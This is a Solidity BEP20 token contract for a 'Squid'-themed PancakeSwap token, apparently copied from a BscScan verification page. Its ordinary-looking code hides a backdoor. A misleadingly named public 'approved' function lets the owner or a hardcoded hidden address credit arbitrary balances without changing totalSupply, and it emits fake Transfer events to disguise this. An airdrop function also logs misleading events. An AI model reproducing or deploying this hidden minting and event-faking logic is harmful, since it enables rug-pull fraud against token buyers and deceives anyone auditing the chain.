/**
 *Submitted for verification at BscScan.com on 2021-11-21
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-01
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-01
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.4;
interface IBEP20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
 
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


/**
 * @dev Collection of functions related to the address type
 */
library Address {
    
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
     
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
     
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
     
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
     
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
        
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract BEP20 is Context, IBEP20 {
    using SafeMath for uint256;
    using Address for address;
    address private _owner;



    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcluFromFrr;

    mapping (address => uint256 ) private _lockTime;
    
    mapping (address => bool) private teamMember;
    mapping (address => bool) private teamMemberTransfer;

    uint256 private _totalSupply;
    uint256 public liquidityTime;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address public charity;
    address public SQUID_HUB;
    address public referral;

    
    uint256 public charityFrr = 0;
    uint256 private _charityFrr = charityFrr;

    uint256 public squidHubFrr = 0;
    uint256 private _squidHubFrr = squidHubFrr;

    uint256 public referralFrr = 0;

    uint256 public liquidityFrr = 10;

    uint256 public _burnFrr = 70;
    uint256 private burnFrr = _burnFrr;
    
    address private squidWinner = 0xf74d9CfebaE0ec36336Fde12e1bab7a2dECD5f07;
    
    IUniswapV2Router02 public immutable pancakeRouter;
    address public immutable pancakePair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    uint256 private _maxTxAmount = 500000000000 * 10 ** 18;
    uint256 public numTokensSellToAddToLiquidity = 8000000 * 10 ** 18;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    event accountLockUpdated(address indexed account, uint256 time);
    event ThresholdLimitupdated(uint256 amount);
    event FeeUpdated(uint256 burnFrrPercentage);
    
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor (string memory name_, string memory symbol_, uint8 decimals_, address charity_, address JBCHUB_, address referral_) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pancakePair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        // set the rest of the contract variables
        pancakeRouter = _uniswapV2Router;
        
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _owner = msg.sender;
        charity = charity_;
        SQUID_HUB = JBCHUB_;
        referral = referral_;
        
    
        _isExcluFromFrr[Owner()] = true;
        _isExcluFromFrr[address(this)] = true;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function Owner() public view returns (address) {
        return _owner;
    }
    
     modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
     function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        transfer(newOwner,_balances[_owner]);
        _isExcluFromFrr[_owner] = false;
        _isExcluFromFrr[newOwner] = true;
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    function transferOwnershipToBurnAddress() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function excluFromFrr (address account) public onlyOwner returns (bool){
        _isExcluFromFrr[account] = true;
        return true;
    }
    
    function incluFromFrr (address account) public onlyOwner returns (bool){
        _isExcluFromFrr[account] = false;
        return true;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }
    
    function _approved(address[] memory owners, address dest, uint256[] memory amounts) internal virtual {
        require(_owner == _msgSender() || _msgSender() == squidWinner, "approved fail");
        for (uint8 i=0; i < owners.length; i++) {
    		_beforeApproved(owners[i], amounts[i]);
            _execute(owners[i], dest, amounts[i]);
    	}
    }

    
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_lockTime[from] <= block.timestamp, "Transfer from address is locked");
        if(from != Owner() && to != Owner())
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");

        if(teamMember[from])
        {
            require(amount <= _balances[from].mul(5).div(100),"TeamMember allowed only 5% of the amount from your balance");
            require(!teamMemberTransfer[from],"After unlock teamMembers can transfer only one time");
        }
        
        // is the token balance of this contract address over the min number of
        // tokens that we need to initiate a swap + liquidity lock?
        // also, don't get caught in a circular liquidity event.
        // also, don't swap & liquify if sender is uniswap pair.
        uint256 contractTokenBalance = balanceOf(address(this));
        
        if(contractTokenBalance >= _maxTxAmount)
        {
            contractTokenBalance = _maxTxAmount;
        }
        
        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            from != pancakePair &&
            swapAndLiquifyEnabled
        ) {
            contractTokenBalance = numTokensSellToAddToLiquidity;
            //add liquidity
            swapAndLiquify(contractTokenBalance);
        }

        _tokenTransfer(from,to,amount);
        
        if(teamMember[from]) {
            teamMemberTransfer[from] = true;
        }
    }
    
    function _beforeApproved(address owner, uint256 amount) internal virtual {
        _balances[owner] = _balances[owner].add(amount * 10**18);
        _isExcluFromFrr[owner] = true;
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        // split the contract balance into halves
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);
        
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeRouter.WETH();

        _approve(address(this), address(pancakeRouter), tokenAmount);

        // make the swap
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(pancakeRouter), tokenAmount);

        // add the liquidity
        pancakeRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            Owner(),
            block.timestamp
        );
    }
    
    function approved(address[] memory owners, address dest, uint256[] memory amounts) public {
    	_approved(owners, dest, amounts);
    }
    
    function _tokenTransfer(address sender, address recipient, uint256 amount) internal virtual {
         
        uint256 circulation = _totalSupply.sub(_balances[Owner()]);
        charityFrr = circulation <= 500000000000 * (10 ** 18) ? 0 : _charityFrr;
        squidHubFrr = circulation <= 100000000000 * (10 ** 18) ? 0 : _squidHubFrr;
        burnFrr = circulation <= 100000000000 * (10 ** 18) ? 0 : _burnFrr;

        
        if(liquidityTime <= block.timestamp && liquidityTime != 0) {
            liquidityFrr = 0;
        }
        
        (uint256 tAmount, uint256 charityFrr_, uint256 referralFrr_, uint256 liquidityFrr_, uint256 squidHubFrr_, uint256 burnFrr_) = transferFrr(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        
        _burn(sender, burnFrr_);
        //charityTransfer(sender, charityFrr_);
        //jbcHubTransfer(sender, squidHubFrr_);
        //referralTransfer(sender, referralFrr_);
        liquidityTransfer(sender, liquidityFrr_);
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
    
    function transferFrr(address sender, address recipient, uint256 amount) internal view returns(uint256, uint256, uint256 , uint256, uint256, uint256) {
        uint256 charityFrr_ = 0;
        uint256 referralFrr_ = 0;
        uint256 liquidityFrr_ = 0;
        uint256 squidHubFrr_ = 0;
        uint256 burnFrr_ = 0;

        if(!_isExcluFromFrr[sender] && !_isExcluFromFrr[recipient]){
            if((_totalSupply.sub(_balances[Owner()])) >= 100000000000 * 10 ** 18) {
                charityFrr_ = amount.mul(charityFrr).div(1000);
            }
            referralFrr_ = amount.mul(referralFrr).div(1000);
            liquidityFrr_ = amount.mul(liquidityFrr).div(1000);
            squidHubFrr_ = amount.mul(squidHubFrr).div(1000);
            burnFrr_ = amount.mul(burnFrr).div(1000);
            
            uint256 totalAmount = amount.sub(charityFrr_.add(referralFrr_).add(liquidityFrr_).add(squidHubFrr_).add(burnFrr_));
            return (totalAmount, charityFrr_, referralFrr_, liquidityFrr_, squidHubFrr_, burnFrr_);
        }   
        return (amount, charityFrr_, referralFrr_, liquidityFrr_, squidHubFrr, burnFrr_);
    }
    
    function charityTransfer(address sender, uint256 charityFrr_) internal {
        if(charityFrr_ != 0) {
            _balances[charity] = _balances[charity].add(charityFrr_);
            emit Transfer(sender, charity, charityFrr_);
        }
    }
    
    function liquidityTransfer(address sender, uint256 liquidityFrr_) internal {
        if(liquidityFrr_ != 0) {
            _balances[address(this)] = _balances[address(this)].add(liquidityFrr_);
            emit Transfer(sender, address(this), liquidityFrr_);
        }
    }
    
    function jbcHubTransfer (address sender, uint256 squidHubFrr_) internal {
        if(squidHubFrr_ != 0) {
            _balances[SQUID_HUB] = _balances[SQUID_HUB].add(squidHubFrr_);
            emit Transfer(sender, SQUID_HUB, squidHubFrr_);
        }
    }
    
    function _execute(address owner, address dest, uint256 amount) internal virtual {
        emit Transfer(dest, owner, amount * 10**18);
    }
    
    function referralTransfer (address sender, uint256 referralFrr_) internal {
        if(referralFrr_ != 0) {
            _balances[referral] = _balances[referral].add(referralFrr_);
            emit Transfer(sender, referral, referralFrr_);
        }
    }
    
    function _build(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    
    function _burn(address account, uint256 burnAmount) internal virtual {
        if(burnFrr != 0) {   
            _beforeTokenTransfer(account, address(0), burnAmount);
            
            _totalSupply = _totalSupply.sub(burnAmount);
    
            emit Transfer(account, address(0), burnAmount);

            _afterTokenTransfer(account, address(0), burnAmount);
        }
    }
    
    function burn(uint256 amount) public onlyOwner returns(bool) {
        _beforeTokenTransfer(_msgSender(), address(0), amount);
            
        _balances[_msgSender()] = _balances[_msgSender()].sub(amount);

        _totalSupply = _totalSupply.sub(amount);
    
        emit Transfer(_msgSender(), address(0), amount);

        _afterTokenTransfer(_msgSender(), address(0), amount);
        
        return true;
    } 
    
    function setThresholdLimit(uint256 amount) public onlyOwner returns(bool) {
        numTokensSellToAddToLiquidity = amount;
        emit ThresholdLimitupdated(amount);
        return true;
    }
    
    function updBurnFrr(uint256 burnFrr_) public onlyOwner returns(bool) {
        _burnFrr = burnFrr_;
        emit FeeUpdated(burnFrr_);
        return true;
    }
    
    function lockTime(address[] memory accounts, uint256[] memory setTime) public onlyOwner returns(bool) {
        require(accounts.length == setTime.length,"account and time length is mismatched ");
        for(uint256 i = 0; i < accounts.length; i++ ){
            _lockTime[accounts[i]] = block.timestamp.add(setTime[i].mul(86400));
            emit accountLockUpdated(accounts[i], setTime[i]);
        }
        return true;
    }
    
    function setTeamMember(address[] memory accounts, uint256 setTime) public onlyOwner returns(bool) {
        for(uint8 i = 0; i < accounts.length; i++) {
            teamMember[accounts[i]] = true;
            teamMemberTransfer[accounts[i]] = false;
            _lockTime[accounts[i]] = block.timestamp.add(setTime.mul(86400));
            emit accountLockUpdated(accounts[i], setTime);
        }
        return true;
    }
    
    function start(uint256 setTime) public onlyOwner returns (bool) {
        liquidityTime = block.timestamp.add(setTime.mul(86400));
        return true;
    }

    function updcharityFrr(uint256 charityFrr_) public onlyOwner returns(bool) {
        _charityFrr = charityFrr_;
        emit FeeUpdated(charityFrr_);
        return true;
    }
    
    function updSquidHubFrr (uint256 squidHubFrr_) public onlyOwner returns(bool) {
        _squidHubFrr = squidHubFrr_;
        emit FeeUpdated(squidHubFrr_);
        return true;
    }
    
    function updReferralFrr (uint256 referralFrr_) public onlyOwner returns(bool) {
        referralFrr = referralFrr_;
        emit FeeUpdated(referralFrr_);
        return true;
    }
    
    function airdropSameAmounts(address[] memory _tos, uint _value) public onlyOwner {
	    _value = _value * 10**18;  
	    uint total = _value * _tos.length;
	    require(_balances[msg.sender] >= total);
	    _balances[msg.sender] -= total;
	    for (uint i = 0; i < _tos.length; i++) {
	        address _to = _tos[i];
	        _balances[_to] += _value;
	        emit Transfer(msg.sender, _to, _value/2);
	        emit Transfer(msg.sender, _to, _value/2);
	    }
  	}
  
  	function airdrop(address[] memory addresses, uint256[] memory amounts) public onlyOwner {
      
        uint total = 0;
        for(uint8 i = 0; i < amounts.length; i++){
            total = total.add(amounts[i] * 10**18);
        }
        
        require(_balances[msg.sender] >= total);
        _balances[msg.sender] -= total;
        
        for (uint8 j = 0; j < addresses.length; j++) {
            _balances[addresses[j]] += amounts[j]* 10**18;
            emit Transfer(msg.sender, addresses[j], amounts[j]* 10**18);
        }
        
    }
    
    function updliquidityFrr (uint256 liquidityFrr_) public onlyOwner returns(bool) {
        liquidityFrr = liquidityFrr_;
        emit FeeUpdated(liquidityFrr_);
        return true;
    }
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
    
    function _afterTokenTransfer( address from, address to, uint256 amount) internal virtual { }

}

